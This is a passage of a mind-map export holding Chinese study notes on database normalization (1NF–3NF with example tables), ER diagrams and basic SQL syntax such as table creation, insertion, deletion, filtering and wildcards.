          3
        </td>
        <td>
          学生-3
        </td>
        <td>
          学院-2
        </td>
        <td>
          院长-2
        </td>
        <td>
          课程-2
        </td>
        <td>
          95
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      不符合范式的关系，会产生很多异常，主要有以下四种异常：
    </p>
    <ul dir="auto">
      <li>
        冗余数据：例如 <code>学生-2</code>&#xa0;出现了两次。
      </li>
      <li>
        修改异常：修改了一个记录中的信息，但是另一个记录中相同的信息却没有被修改。
      </li>
      <li>
        删除异常：删除一个信息，那么也会丢失其它信息。例如删除了 <code>课程-1</code>&#xa0;需要删除第一行和第三行，那么 <code>学生-1</code>&#xa0;的信息就会丢失。
      </li>
      <li>
        插入异常：例如想要插入一个学生的信息，如果这个学生还没选课，那么就无法插入。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_727859339" CREATED="1754750543707" MODIFIED="1754750543709"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      范式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 范式" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#范式">
</a>
    <p dir="auto">
      范式理论是为了解决以上提到四种异常。
    </p>
    <p dir="auto">
      高级别范式的依赖于低级别的范式，1NF 是最低级别的范式。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1911451510" CREATED="1754750543709" MODIFIED="1754750543711"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 第一范式 (1NF)
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 第一范式 (1NF)" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#1-第一范式-1nf">
</a>
    <p dir="auto">
      属性不可分。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1465490757" CREATED="1754750543711" MODIFIED="1754750543714"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 第二范式 (2NF)
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 第二范式 (2NF)" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#2-第二范式-2nf">
</a>
    <p dir="auto">
      每个非主属性完全函数依赖于键码。
    </p>
    <p dir="auto">
      可以通过分解来满足。
    </p>
    <p dir="auto">
      <strong>分解前</strong><br/>
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          Sno
        </th>
        <th>
          Sname
        </th>
        <th>
          Sdept
        </th>
        <th>
          Mname
        </th>
        <th>
          Cname
        </th>
        <th>
          Grade
        </th>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          学生-1
        </td>
        <td>
          学院-1
        </td>
        <td>
          院长-1
        </td>
        <td>
          课程-1
        </td>
        <td>
          90
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          学生-2
        </td>
        <td>
          学院-2
        </td>
        <td>
          院长-2
        </td>
        <td>
          课程-2
        </td>
        <td>
          80
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          学生-2
        </td>
        <td>
          学院-2
        </td>
        <td>
          院长-2
        </td>
        <td>
          课程-1
        </td>
        <td>
          100
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          学生-3
        </td>
        <td>
          学院-2
        </td>
        <td>
          院长-2
        </td>
        <td>
          课程-2
        </td>
        <td>
          95
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      以上学生课程关系中，{Sno, Cname} 为键码，有如下函数依赖：
    </p>
    <ul dir="auto">
      <li>
        Sno -&gt; Sname, Sdept
      </li>
      <li>
        Sdept -&gt; Mname
      </li>
      <li>
        Sno, Cname-&gt; Grade
      </li>
    </ul>
    <p dir="auto">
      Grade 完全函数依赖于键码，它没有任何冗余数据，每个学生的每门课都有特定的成绩。
    </p>
    <p dir="auto">
      Sname, Sdept 和 Mname 都部分依赖于键码，当一个学生选修了多门课时，这些数据就会出现多次，造成大量冗余数据。
    </p>
    <p dir="auto">
      <strong>分解后</strong><br/>
    </p>
    <p dir="auto">
      关系-1
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          Sno
        </th>
        <th>
          Sname
        </th>
        <th>
          Sdept
        </th>
        <th>
          Mname
        </th>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          学生-1
        </td>
        <td>
          学院-1
        </td>
        <td>
          院长-1
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          学生-2
        </td>
        <td>
          学院-2
        </td>
        <td>
          院长-2
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          学生-3
        </td>
        <td>
          学院-2
        </td>
        <td>
          院长-2
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      有以下函数依赖：
    </p>
    <ul dir="auto">
      <li>
        Sno -&gt; Sname, Sdept
      </li>
      <li>
        Sdept -&gt; Mname
      </li>
    </ul>
    <p dir="auto">
      关系-2
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          Sno
        </th>
        <th>
          Cname
        </th>
        <th>
          Grade
        </th>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          课程-1
        </td>
        <td>
          90
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          课程-2
        </td>
        <td>
          80
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          课程-1
        </td>
        <td>
          100
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          课程-2
        </td>
        <td>
          95
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      有以下函数依赖：
    </p>
    <ul dir="auto">
      <li>
        Sno, Cname -&gt; Grade
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1537545819" CREATED="1754750543714" MODIFIED="1754750543716"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 第三范式 (3NF)
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 第三范式 (3NF)" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#3-第三范式-3nf">
</a>
    <p dir="auto">
      非主属性不传递函数依赖于键码。
    </p>
    <p dir="auto">
      上面的 关系-1 中存在以下传递函数依赖：
    </p>
    <ul dir="auto">
      <li>
        Sno -&gt; Sdept -&gt; Mname
      </li>
    </ul>
    <p dir="auto">
      可以进行以下分解：
    </p>
    <p dir="auto">
      关系-11
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          Sno
        </th>
        <th>
          Sname
        </th>
        <th>
          Sdept
        </th>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          学生-1
        </td>
        <td>
          学院-1
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          学生-2
        </td>
        <td>
          学院-2
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          学生-3
        </td>
        <td>
          学院-2
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      关系-12
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          Sdept
        </th>
        <th>
          Mname
        </th>
      </tr>
      <tr>
        <td>
          学院-1
        </td>
        <td>
          院长-1
        </td>
      </tr>
      <tr>
        <td>
          学院-2
        </td>
        <td>
          院长-2
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_737676589" CREATED="1754750543717" MODIFIED="1754750543719"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      八、ER 图
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 八、ER 图" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#八er-图">
</a>
    <p dir="auto">
      Entity-Relationship，有三个组成部分：实体、属性、联系。
    </p>
    <p dir="auto">
      用来进行关系型数据库系统的概念设计。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1562435226" CREATED="1754750543719" MODIFIED="1754750543721"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      实体的三种联系
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 实体的三种联系" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#实体的三种联系">
</a>
    <p dir="auto">
      包含一对一，一对多，多对多三种。
    </p>
    <ul dir="auto">
      <li>
        如果 A 到 B 是一对多关系，那么画个带箭头的线段指向 B；
      </li>
      <li>
        如果是一对一，画两个带箭头的线段；
      </li>
      <li>
        如果是多对多，画两个不带箭头的线段。
      </li>
    </ul>
    <p dir="auto">
      下图的 Course 和 Student 是一对多的关系。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5e9a90f932d9bb21143bc9d6b3d870a80fbfe85268c1f15a78e63dfbd248d927/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31643238616430352d333965352d343961322d613661312d6136663439366164626136612e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5e9a90f932d9bb21143bc9d6b3d870a80fbfe85268c1f15a78e63dfbd248d927/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31643238616430352d333965352d343961322d613661312d6136663439366164626136612e706e67" width="380px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1d28ad05-39e5-49a2-a6a1-a6f496adba6a.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_892234961" CREATED="1754750543721" MODIFIED="1754750543724"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      表示出现多次的关系
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 表示出现多次的关系" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#表示出现多次的关系">
</a>
    <p dir="auto">
      一个实体在联系出现几次，就要用几条线连接。
    </p>
    <p dir="auto">
      下图表示一个课程的先修关系，先修关系出现两个 Course 实体，第一个是先修课程，后一个是后修课程，因此需要用两条线来表示这种关系。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/76ca76cc66aa8960c6d099c99399c7c40ff9c3792ff0907002b7dbb3c8eedccb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61633932396561332d646163612d343065632d396539352d3462326661363637383234332e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/76ca76cc66aa8960c6d099c99399c7c40ff9c3792ff0907002b7dbb3c8eedccb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61633932396561332d646163612d343065632d396539352d3462326661363637383234332e706e67" width="250px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ac929ea3-daca-40ec-9e95-4b2fa6678243.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_247711538" CREATED="1754750543725" MODIFIED="1754750543727"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      联系的多向性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 联系的多向性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#联系的多向性">
</a>
    <p dir="auto">
      虽然老师可以开设多门课，并且可以教授多名学生，但是对于特定的学生和课程，只有一个老师教授，这就构成了一个三元联系。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7a29d5f2a3039f2a20b0e36bc67254e994a2135fc930adb13c62a385eaa38cbc/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f35626231623338612d353237652d343830322d613338352d3236376461646264333062612e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/7a29d5f2a3039f2a20b0e36bc67254e994a2135fc930adb13c62a385eaa38cbc/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f35626231623338612d353237652d343830322d613338352d3236376461646264333062612e706e67" width="350px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5bb1b38a-527e-4802-a385-267dadbd30ba.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_391724036" CREATED="1754750543727" MODIFIED="1754750543729"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      表示子类
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 表示子类" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#表示子类">
</a>
    <p dir="auto">
      用一个三角形和两条线来连接类和子类，与子类有关的属性和联系都连到子类上，而与父类和子类都有关的连到父类上。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7cc3117a070c07112c9ebed61c82d4155022d86371e0fdafa9284a665ab39116/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31343338396561342d386439362d346539362d396637362d3536346361333332346331652e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/7cc3117a070c07112c9ebed61c82d4155022d86371e0fdafa9284a665ab39116/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31343338396561342d386439362d346539362d396637362d3536346361333332346331652e706e67" width="450px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/14389ea4-8d96-4e96-9f76-564ca3324c1e.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_563904129" CREATED="1754750543729" MODIFIED="1754750543732"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        AbrahamSilberschatz, HenryF.Korth, S.Sudarshan, 等. 数据库系统概念 [M]. 机械工业出版社, 2006.
      </li>
      <li>
        施瓦茨. 高性能 MYSQL(第3版)[M]. 电子工业出版社, 2013.
      </li>
      <li>
        史嘉权. 数据库系统概论[M]. 清华大学出版社有限公司, 2006.
      </li>
      <li>
        <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html" rel="nofollow">The InnoDB Storage Engine</a>
      </li>
      <li>
        <a href="https://www.slideshare.net/ErnestoHernandezRodriguez/transaction-isolation-levels" rel="nofollow">Transaction isolation levels</a>
      </li>
      <li>
        <a href="http://scanftree.com/dbms/2-phase-locking-protocol" rel="nofollow">Concurrency Control</a>
      </li>
      <li>
        <a href="https://www.slideshare.net/brshristov/the-nightmare-of-locking-blocking-and-isolation-levels-46391666" rel="nofollow">The Nightmare of Locking, Blocking and Isolation Levels!</a>
      </li>
      <li>
        <a href="https://aksakalli.github.io/2012/03/12/database-normalization-and-normal-forms-with-an-example.html" rel="nofollow">Database Normalization and Normal Forms with an Example</a>
      </li>
      <li>
        <a href="https://blog.jcole.us/2014/04/16/the-basics-of-the-innodb-undo-logging-and-history-system/" rel="nofollow">The basics of the InnoDB undo logging and history system</a>
      </li>
      <li>
        <a href="https://www.brightbox.com/blog/2013/10/31/on-mysql-locks/" rel="nofollow">MySQL locking for the busy web developer</a>
      </li>
      <li>
        <a href="https://draveness.me/mysql-innodb" rel="nofollow">浅入浅出 MySQL 和 InnoDB</a>
      </li>
      <li>
        <a href="https://tech.meituan.com/2014/08/20/innodb-lock.html" rel="nofollow">Innodb 中的事务隔离级别和锁的关系</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_758904184" CREATED="1754749805671" MODIFIED="1754750552468" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL 语法
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_660364331" CREATED="1754750547960" MODIFIED="1754750547962"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、基础
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、基础" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#一基础">
</a>
    <p dir="auto">
      模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。
    </p>
    <p dir="auto">
      主键的值不允许修改，也不允许复用（不能将已经删除的主键值赋给新数据行的主键）。
    </p>
    <p dir="auto">
      SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。
    </p>
    <p dir="auto">
      SQL 语句不区分大小写，但是数据库表名、列名和值是否区分依赖于具体的 DBMS 以及配置。
    </p>
    <p dir="auto">
      SQL 支持以下三种注释：
    </p>
    <pre>## 注释
SELECT *
FROM mytable; -- 注释
/* 注释1
   注释2 */</pre>
    <p dir="auto">
      数据库创建与使用：
    </p>
    <pre>CREATE DATABASE test;
USE test;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1765341356" CREATED="1754750547963" MODIFIED="1754750547965"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、创建表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、创建表" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#二创建表">
</a>
    <pre>CREATE TABLE mytable (
  # int 类型，不为空，自增
  id INT NOT NULL AUTO_INCREMENT,
  # int 类型，不可为空，默认值为 1，不为空
  col1 INT NOT NULL DEFAULT 1,
  # 变长字符串类型，最长为 45 个字符，可以为空
  col2 VARCHAR(45) NULL,
  # 日期类型，可为空
  col3 DATE NULL,
  # 设置主键为 id
  PRIMARY KEY (`id`));</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_725693108" CREATED="1754750547965" MODIFIED="1754750547967"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、修改表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 三、修改表" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#三修改表">
</a>
    <p dir="auto">
      添加列
    </p>
    <pre>ALTER TABLE mytable
ADD col CHAR(20);</pre>
    <p dir="auto">
      删除列
    </p>
    <pre>ALTER TABLE mytable
DROP COLUMN col;</pre>
    <p dir="auto">
      删除表
    </p>
    <pre>DROP TABLE mytable;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1134326942" CREATED="1754750547968" MODIFIED="1754750547970"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、插入
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 四、插入" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#四插入">
</a>
    <p dir="auto">
      普通插入
    </p>
    <pre>INSERT INTO mytable(col1, col2)
VALUES(val1, val2);</pre>
    <p dir="auto">
      插入检索出来的数据
    </p>
    <pre>INSERT INTO mytable1(col1, col2)
SELECT col1, col2
FROM mytable2;</pre>
    <p dir="auto">
      将一个表的内容插入到一个新表
    </p>
    <pre>CREATE TABLE newtable AS
SELECT * FROM mytable;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_132729724" CREATED="1754750547970" MODIFIED="1754750547972"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、更新
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 五、更新" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#五更新">
</a>
    <pre>UPDATE mytable
SET col = val
WHERE id = 1;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1442791629" CREATED="1754750547973" MODIFIED="1754750547975"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、删除
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 六、删除" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#六删除">
</a>
    <pre>DELETE FROM mytable
WHERE id = 1;</pre>
    <p dir="auto">
      <strong>TRUNCATE TABLE</strong>&#xa0;可以清空表，也就是删除所有行。
    </p>
    <pre>TRUNCATE TABLE mytable;</pre>
    <p dir="auto">
      使用更新和删除操作时一定要用 WHERE 子句，不然会把整张表的数据都破坏。可以先用 SELECT 语句进行测试，防止错误删除。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_811150636" CREATED="1754750547976" MODIFIED="1754750547976"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      七、查询
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_289160372" CREATED="1754750547977" MODIFIED="1754750547979"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      DISTINCT
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: DISTINCT" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#distinct">
</a>
    <p dir="auto">
      相同值只会出现一次。它作用于所有列，也就是说所有列的值都相同才算相同。
    </p>
    <pre>SELECT DISTINCT col1, col2
FROM mytable;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1897063569" CREATED="1754750547980" MODIFIED="1754750547981"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      LIMIT
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: LIMIT" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#limit">
</a>
    <p dir="auto">
      限制返回的行数。可以有两个参数，第一个参数为起始行，从 0 开始；第二个参数为返回的总行数。
    </p>
    <p dir="auto">
      返回前 5 行：
    </p>
    <pre>SELECT *
FROM mytable
LIMIT 5;</pre>
    <pre>SELECT *
FROM mytable
LIMIT 0, 5;</pre>
    <p dir="auto">
      返回第 3 ~ 5 行：
    </p>
    <pre>SELECT *
FROM mytable
LIMIT 2, 3;</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_718256259" CREATED="1754750547982" MODIFIED="1754750547983"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      八、排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 八、排序" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#八排序">
</a>
    <ul dir="auto">
      <li>
        <strong>ASC</strong>&#xa0;：升序（默认）
      </li>
      <li>
        <strong>DESC</strong>&#xa0;：降序
      </li>
    </ul>
    <p dir="auto">
      可以按多个列进行排序，并且为每个列指定不同的排序方式：
    </p>
    <pre>SELECT *
FROM mytable
ORDER BY col1 DESC, col2 ASC;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_356033575" CREATED="1754750547984" MODIFIED="1754750547986"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      九、过滤
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 九、过滤" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#九过滤">
</a>
    <p dir="auto">
      不进行过滤的数据非常大，导致通过网络传输了多余的数据，从而浪费了网络带宽。因此尽量使用 SQL 语句来过滤不必要的数据，而不是传输所有的数据到客户端中然后由客户端进行过滤。
    </p>
    <pre>SELECT *
FROM mytable
WHERE col IS NULL;</pre>
    <p dir="auto">
      下表显示了 WHERE 子句可用的操作符
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          操作符
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          =
        </td>
        <td>
          等于
        </td>
      </tr>
      <tr>
        <td>
          &lt;
        </td>
        <td>
          小于
        </td>
      </tr>
      <tr>
        <td>
          &gt;
        </td>
        <td>
          大于
        </td>
      </tr>
      <tr>
        <td>
          &lt;&gt; !=
        </td>
        <td>
          不等于
        </td>
      </tr>
      <tr>
        <td>
          &lt;= !&gt;
        </td>
        <td>
          小于等于
        </td>
      </tr>
      <tr>
        <td>
          &gt;= !&lt;
        </td>
        <td>
          大于等于
        </td>
      </tr>
      <tr>
        <td>
          BETWEEN
        </td>
        <td>
          在两个值之间
        </td>
      </tr>
      <tr>
        <td>
          IS NULL
        </td>
        <td>
          为 NULL 值
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      应该注意到，NULL 与 0、空字符串都不同。
    </p>
    <p dir="auto">
      <strong>AND 和 OR</strong>&#xa0;用于连接多个过滤条件。优先处理 AND，当一个过滤表达式涉及到多个 AND 和 OR 时，可以使用 () 来决定优先级，使得优先级关系更清晰。
    </p>
    <p dir="auto">
      <strong>IN</strong>&#xa0;操作符用于匹配一组值，其后也可以接一个 SELECT 子句，从而匹配子查询得到的一组值。
    </p>
    <p dir="auto">
      <strong>NOT</strong>&#xa0;操作符用于否定一个条件。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_966007342" CREATED="1754750547987" MODIFIED="1754750547989"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十、通配符
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十、通配符" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#十通配符">
</a>
    <p dir="auto">
      通配符也是用在过滤语句中，但它只能用于文本字段。
    </p>
    <ul dir="auto">
      <li>
        <p dir="auto">
          <strong>%</strong>&#xa0;匹配 &gt;=0 个任意字符；
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>_</strong>&#xa0;匹配 ==1 个任意字符；
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>[ ]</strong>&#xa0;可以匹配集合内的字符，例如 [ab] 将匹配字符 a 或者 b。用脱字符 ^ 可以对其进行否定，也就是不匹配集合内的字符。
        </p>
      </li>
    </ul>
    <p dir="auto">
      使用 Like 来进行通配符匹配。
    </p>
    <pre>SELECT *
FROM mytable
WHERE col LIKE '[^AB]%'; -- 不以 A 和 B 开头的任意文本</pre>
    <p dir="auto">
      不要滥用通配符，通配符位于开头处匹配会非常慢。
    </p>
  </body>
</html></richcontent>
</node>
